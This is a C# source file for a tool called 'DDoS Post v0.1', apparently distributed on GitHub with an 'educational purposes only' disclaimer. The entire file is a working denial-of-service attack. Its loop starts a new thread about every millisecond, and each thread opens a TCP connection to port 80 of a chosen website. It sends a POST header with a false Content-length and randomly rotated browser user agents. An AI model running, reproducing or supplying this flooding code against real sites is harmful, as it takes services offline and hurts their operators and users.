using System;
using System.Globalization;
using System.Net.Sockets;
using System.Text;
using System.Threading;
namespace DDoS_Post
{

    //       │ Author     : NYAN CAT
    //       │ Name       : DDoS Post v0.1
    //       │ Contact    : https://github.com/NYAN-x-CAT

    //       This program is distributed for educational purposes only.

    public class DdosPost
    {
        private readonly string[] userAgents = { " Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};
        public string Host { get; set; }
        public CancellationToken CancelToken { get; set; }
        public DdosPost(string host, CancellationToken cancelToken)
        {
            Host = host;
            CancelToken = cancelToken;
        }
        public void RunAttack()
        {
            if (string.IsNullOrWhiteSpace(Host) || CancelToken == null) return;
            if (Host.StartsWith("https://", true, CultureInfo.CurrentCulture)) Host = Host.Replace("https://", null);
            if (Host.StartsWith("http://", true, CultureInfo.CurrentCulture)) Host = Host.Replace("http://", null);
            if (Host.StartsWith("www.", true, CultureInfo.CurrentCulture)) Host = Host.Replace("www.", null);
            while (!CancelToken.IsCancellationRequested)
            {
                new Thread(() =>
                {
                    try
                    {
                        TcpClient tcp = new TcpClient(Host, 80);
                        string post = $"POST / HTTP/1.1\r\nHost: {Host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                        byte[] buffer = Encoding.UTF8.GetBytes(post);
                        tcp.Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                        Console.WriteLine($"Packet has been sent [{DateTime.Now.ToLongTimeString()}]");
                        tcp.Client.Dispose();
                    }
                    catch
                    {
                        Console.WriteLine("Website may be down!");
                    }
                }).Start();
                Thread.Sleep(1);
            }
        }
    }
}